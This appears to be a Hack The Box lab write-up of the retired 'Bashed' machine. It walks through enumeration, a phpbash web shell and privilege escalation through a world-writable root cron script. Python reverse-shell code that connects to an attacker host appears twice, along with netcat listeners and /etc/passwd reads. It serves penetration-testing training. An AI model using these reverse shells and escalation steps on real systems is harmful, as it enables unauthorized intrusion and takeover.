\# Hack The Box: Bashed \*(Retired)\*



\- \*\*Target:\*\* `Bashed`

\- \*\*Date Completed:\*\* September 16, 2025

\- \*\*Difficulty:\*\* Easy \*(felt medium as first box)\*

\- \*\*Flags:\*\*

&nbsp; - User: `<user-flag>`

&nbsp; - Root: `<root-flag>`



> 📝 \*\*Note\*\*: This writeup is for the retired Hack The Box machine `Bashed`. All content is for educational purposes in authorized lab environments only. IPs and flags are redacted to comply with HTB’s Terms of Service.



---



\## 🔍 Initial Enumeration



\### Nmap



nmap -sC -sV -p- --min-rate=1000 <target-ip>

Open port: 80/tcp



Service: Apache HTTPD 2.4.18 (Ubuntu)



Site Title: Arrexel's Development Site



\### Web Discovery

Visited: http://<target-ip>

Added IP and redirected search domain to /etc/hosts file

Found GitHub link: https://github.com/Arrexel/phpbash



\### Directory Enumeration (Gobuster)



gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,html -o gobuster.txt



Interesting directories:



/dev/



/uploads/



/php/



Finding the Shell =>

Discovered working shell at:

http://<target-ip>/dev/phpbash.php



\## Foothold (Web Shell)

Accessed semi-interactive web shell as www-data



Basic Enumeration

whoami

id

ls -la

ls -lha /home

cat /etc/passwd



Discovered users:

arrexel

scriptmanager



\## Shell Upgrade (TTY)

Improved shell usability:



Initiate Netcat listener in Attacker machine

nc -lnvp port



Used Reverse Shell script from Pentest Monkey cheat sheet in the obtained webshell

python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$IP",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(\["/bin/bash"])'



Executed the below commands in attacker machine to make the shell interactive and better

python3 -c 'import pty; pty.spawn("/bin/bash")'



Ctrl+Z (background shell)

stty raw -echo

fg (foreground the listener shell)

export TERM=xterm



\## User Flag Access

Switched to arrexel's home directory:



cat /home/arrexel/user.txt

✅ User Flag: <user-flag-captured>



\## Privilege Escalation



\### Know about current user's permission

sudo -l 

Switching User to scriptmanager user as it requires NO PASSWORD

Successfully switched to scriptmanager without password:



sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'



\### Enumerating Scriptmanager user

ls -la

ls -ls /home

id

groups

checking for permissions

find / -perm -4000 -type f 2>/dev/null

find / -perm -2000 -type f 2>/dev/null



sudo -l ==> requires password for Scriptmanager profile

cat /etc/crontab

ls -la /etc/cron\*

ps aux | grep cron



\### Cronjob Enumeration with pspy

Downloaded and ran pspy64.



Observations:

Cron runs /scripts/test.py as root every minute



/Scripts folder and test.py is world-writable



It generates a test.txt file with root permissions / admin rights — evidence of execution



\### Exploiting Cronjob for Root Shell

Replaced test.py with reverse shell:



import socket, subprocess, os

s = socket.socket()

s.connect(("<attacker-ip>", <port>))

os.dup2(s.fileno(), 0)

os.dup2(s.fileno(), 1)

os.dup2(s.fileno(), 2)

subprocess.call(\["/bin/bash"])



Started listener:

nc -lvnp <port>



Got reverse shell as root



\## Root Flag Access

Switched to root home directory:



cd /root

cat root.txt

✅ Root Flag: <root-flag-captured>



\## Learnings \& Reflections

Key Takeaways:

Got hands-on with cronjob-based privilege escalation



Learned to use pspy for live process monitoring



Practiced switching users with sudo -u (no password required)



Learned to upgrade shells with Python’s pty.spawn



Gained first experience working with web shells like phpbash



Reverse engineering the python script and observing UID, profiles and permissions with which the .py scripts and output files are generated



📎 Tags

\#HTB #OSCP #PrivilegeEscalation #CronJobs #pspy #WebShell #Writeup #Linux

